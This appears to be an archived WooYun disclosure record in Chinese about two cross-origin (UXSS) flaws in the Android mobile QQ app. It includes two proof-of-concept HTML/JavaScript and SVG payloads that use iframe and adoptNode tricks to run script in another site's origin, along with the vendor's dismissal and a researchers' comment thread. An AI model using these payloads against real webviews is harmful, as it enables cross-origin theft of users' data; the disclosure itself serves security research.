{"id": 889, "wybug_id": "wooyun-2014-068174", "wybug_title": "手机QQ安卓版两处跨域问题", "wybug_corp": "腾讯", "wybug_author": "瘦蛟舞", "wybug_date": "2014-07-11 14:15", "wybug_open_date": "2014-10-06 14:16", "wybug_type": "用户敏感数据泄漏", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向公众公开  简要描述： 手机qq安卓版两处跨域问题 详细说明：  POC1\n<body> <script> i = document.body.appendChild(document.createElement(\"iframe\")); i.src = \"http://m.baidu.com\"; i.onload = function() { document.documentURI = \"javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)\"; i.contentWindow.location = \"\"; } </script> </body>\n\n\n   漏洞证明：  POC2test.html\n<head><script>main = function(){\tspecialFrame = document.body.appendChild(document.createElement(\"iframe\"));\tdocument.adoptNode(specialFrame);\tdocument.implementation.createHTMLDocument().adoptNode(specialFrame);\tspecialFrame.contentWindow.location = \"http://www.baidu.com/\";\tinterval1 = setInterval(function() {\t\tif (specialFrame.contentDocument)\t\t\treturn;\t\tclearInterval(interval1);\t\tspecialFrame.src = \"javascript:alert(document.body.innerHTML)\";\t\tuxssFrame = document.body.appendChild(document.createElement(\"iframe\"));\t\tuxssFrame.src = \"test.svg\";\t}, 100);}</script></head><body onload=\"main()\"></body>\ntest.svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><script>svg = document.documentElement;frame = svg.appendChild(document.createElementNS(\"http://www.w3.org/1999/xhtml\", \"iframe\"));frame.contentWindow.onunload = function() {\tsvg.appendChild(top.specialFrame);}</script> <element param=\"1\" param=\"2\"/></svg>\n\n\n   修复方案：  求解决方案   版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-06 14:16 厂商回复： 非常感谢您的报告，此问题属于andriod webkit的漏洞，请尽量使用最新版的andriod系统。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-11 14:28 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  呵呵。。。。。 果断忽略，，    \n     2014-07-11 14:30 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @mango 这个无所谓，希望他们能反馈下解决方案。    \n     2014-07-11 14:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @瘦蛟舞 安卓的内核问题吧 升级？    \n     2014-07-11 14:34 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @xsser android组件问题，主流手机浏览器都已经解决。感觉这种高安装量的客户端和浏览器类应用必须解决这个。    \n     2014-07-11 14:37 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  前排出售瓜子    \n     2014-07-11 14:49 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @瘦蛟舞 欢迎下次来众测    \n     2014-07-11 14:50 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @xsser 已经和301混熟了。。。    \n     2014-07-11 15:19 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @xsser @瘦蛟舞 放心绝对忽略。。。我提交过了。。。全部给我忽略了。。。连微信都忽略了。。。草！    \n     2014-07-11 15:19 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @瘦蛟舞 解决方案我给过他们了    \n     2014-07-11 15:20 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  洞主是个好人。    \n     2014-07-11 15:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @mango 呵呵    \n     2014-07-11 15:42 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @mango 你跟他一样？    \n     2014-07-11 15:44 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  mark  等更新，看厂商怎么回复    \n     2014-07-11 15:50 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  洞主是个好人。     \n     2014-07-11 16:07 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @xsser  - - 你让我怎么理解这两个字！！！    \n     2014-07-11 18:31 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @mango 呵呵    \n     2014-07-11 19:40 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @mango 呵呵 不来我乌云提交的都是250    \n     2014-07-11 20:59 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  又有人要喷\"明明公开了我还看不到\" 　:)    \n     2014-07-12 08:43 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  @超威蓝猫 新来的求为什么我看不见、、、    \n     2014-07-12 08:50 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @Ev1l 是呀我也看不见 :)    \n     2014-07-12 09:14 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  @超威蓝猫 ///大神你别笑话我了、为什么啊    \n     2014-07-12 21:43 |    \t\twarning3 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:6        | 巨人背后的安全专家，保障客户业务顺畅运行)\t\t \n  @瘦蛟舞 这种问题基本上除了那些自有内核的浏览器APP改了，因为是系统webkit的问题，其他大量用的webview的APP都会被影响，包括微信、来往、易信、微博等等，你也别用老版本的android了，你要是用2.3的android来测漏洞，什么疼的洞都有，app无辜躺枪。所以赶紧用4.4的来    \n     2014-07-12 21:45 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @warning3 4.0 4.2 都有    \n     2014-07-12 21:56 |    \t\twarning3 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:6        | 巨人背后的安全专家，保障客户业务顺畅运行)\t\t \n  @mango 4.3也有啊，4.4就没了，你可以给google报，这是android的问题。就比如说你不能因为master key漏洞app能重打包绕过签名，就说是app的漏洞吧。APP能修复的系统问题自然去修复的好，但是这个问题要修复，至少得动很多，包括国外众多知名app都会被影响也没去修复，你也可以给facebook、给twitter报，只是人家忽略一下而已。    \n     2014-07-12 22:09 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @warning3 android基本一个手机一个系统用到换手机。。kitkat以前都会受影响。。现在占有率最高的是jelly bean了。    \n     2014-07-12 22:10 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  @瘦蛟舞 表示直接换苹果得了。。。不过今天也爆了苹果数据泄漏    \n     2014-07-12 22:12 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @Ev1l 你和evil啥关系？    \n     2014-07-12 22:12 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  @瘦蛟舞 额、、、你认为呢，基本没啥关系，我就是个小白。    \n     2014-07-16 16:58 |    \t\t无花果 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  @mango 乌云给忽略了怎么破？！！    \n     2014-07-16 17:11 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @无花果 都忽略了    \n     2014-07-20 10:44 |    \t\twarning3 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:6        | 巨人背后的安全专家，保障客户业务顺畅运行)\t\t \n  @mango @瘦蛟舞 如果不忽略，那也可以报个手机qq master key漏洞伪造包的问题，哈哈    \n     2014-07-20 15:12 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @warning3 哈哈~ 求案例~    \n     2014-07-25 08:23 |    \t\t无花果 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  @mango 塞班s60飘过无压力！！    \n     2014-07-28 18:30 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  你这第一个是微信吧 - -    \n     2014-07-28 18:39 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @mango 少侠好眼力。。    \n     2014-07-28 20:22 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @瘦蛟舞  = = 我就说么。。。QQ那早测试过了。。    \n     2015-02-04 19:10 |    \t\t我是小号6 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:25        | http://www.a666666.wang/)\t\t \n  POC是怎么利用的呢？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}